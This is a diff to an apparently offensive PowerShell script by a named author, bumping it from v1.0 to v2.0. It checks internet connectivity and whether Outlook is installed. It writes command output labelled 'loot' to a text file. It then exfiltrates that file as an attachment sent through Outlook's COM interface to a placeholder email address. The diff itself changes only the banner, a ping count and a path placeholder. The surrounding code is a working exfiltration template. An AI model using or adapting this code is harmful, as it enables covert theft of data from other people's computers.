@@ -1,5 +1,4 @@
-Write-Output @"
-
+@"
         __   ____   _        ___      __     ____     ______      _____      ___     _    _
 \    ___) \  \  /  / \    ___) (_    _) \   |    \   |      )    (     )    (   \   | )  / 
  |  (__    \  \/  /   |  (__     |  |    |  |     |  |     /      \   /      \   |  |/  /  
@@ -7,7 +6,7 @@ Write-Output @"
  |  (___   /  /\  \   |  (      _|  |_   |  |__   |  |__   \      /   \      /   |  |\  \  
 /       )_/  /__\  \_/    \____(      )_/      )_/      )___)    (_____)    (___/   |_)  \_ 
 
-v.1.0 
+v.2.0 
 by Jonmar Corpuz
 
 ----------------------------------------------------------------------------------------------------------------------------------------------------------------------
@@ -21,7 +20,7 @@ by Jonmar Corpuz
 # ---------------------------------------------------------------------------------- #
 
 # Check for Internet connectivity
-if (Test-Connection -ComputerName 8.8.8.8 -Count 2 -Quiet) {
+if (Test-Connection -ComputerName 8.8.8.8 -Count 4 -Quiet) {
 
     # Check if Outlook is enabled
     $registryPath = "HKLM:\Software\Clients\Mail\Microsoft Outlook"
@@ -75,7 +74,7 @@ Write-Output "ENTER COMMANDS IN THIS BLOCK !" > "PATH\FILENAME.txt" # FILL OUT
 # Step 4: Exfiltrate the text file containing the loot using Outlook                 #
 # ---------------------------------------------------------------------------------- #
 
-$ATTACHMENT = "{PATH}\{FILENAME}.txt"
+$ATTACHMENT = "PATH\FILENAME.txt"
 $outlook = New-Object -comobject outlook.application
 $email = $outlook.CreateItem(0)
 $email.To = "EMAIL" # FILL OUT
